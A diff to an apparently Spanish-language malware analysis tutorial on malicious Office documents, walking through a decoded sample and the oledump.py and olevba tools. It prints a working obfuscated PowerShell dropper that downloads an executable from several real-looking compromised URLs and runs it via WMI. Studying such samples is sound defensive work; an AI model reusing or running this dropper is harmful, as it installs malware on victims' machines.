@@ -256,7 +256,40 @@ Podemos visualizar el instrucción con el comando:
 `echo "churro" | base64 -d`
 
 
+La instrución generada es la siguiente:
 
+`$liechrouhwuw='vuacdouvcioxhaol';[Net.ServicePointManager]::"SE`cuRiTy`PRO`ToC`ol" = 'tls12, tls11, tls';$deichbeudreir = '337';$quoadgoijveum='duuvmoezhaitgoh';$toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe';$sienteed='quainquachloaz';$reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT;$jacleewyiqu='https://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*https://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*http://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*http://holfve.se/images/1ckw5mj49w_2k11px_d/*http://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);$seccierdeeth='duuzyeawpuaqu';foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey);$buhxeuh='doeydeidquaijleuc';If ((.('Get-'+'Ite'+'m') $toehfethxohbaey)."l`eNGTH" -ge 24751) {([wmiclass]'win32_Process')."C`ReaTe"($toehfethxohbaey);$quoodteeh='jiafruuzlaolthoic';break;$chigchienteiqu='yoowveihniej'}}catch{}}$toizluulfier='foqulevcaoj'`
+
+
+Podemos interpretar perfectamente, la llamada a la clase WebClient y luego indica las urls a las que quiere consultar la información.
+
+El siguiente caso llama a la clase wmi32_process, al método créate, para crear un nuevo proceso, con el fichero que se ha descargado y ejecutarlo vía WMI.
+
+Esta misma información, es exactamente la misma información obtenida a través del servicio AnyRun.
+
+En otras situaciones, anyrun no es capaz de detectar este comportamiento.
+
+![image036.png](/uploads/InitialAccess/image036.png)
+
+En estos casos, es necesario realizar un análisis más a fondo del documento.
+
+### Oledump.py
+
+SI nos fijamos detenidamente en el output, en el apartado de la izquierda, tenemos unas letras “M”, “m”. Debemos rebuscar en los streams donde la M es como vemos, la letra mayúscula, la m referencia atributos.
+
+![image038.png](/uploads/InitialAccess/image038.png)
+
+
+Podemos extraer las macros de la siguiente forma:
+
+`oledump.py -s 13 sample.bin`
+
+
+Como vemos, este paso debería ir haciendolo por cada macro encontrada.
+
+### OleVba
+
+> olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings. XLM/Excel 4 Macros are also supported in Excel and SLK files.
 
 
 
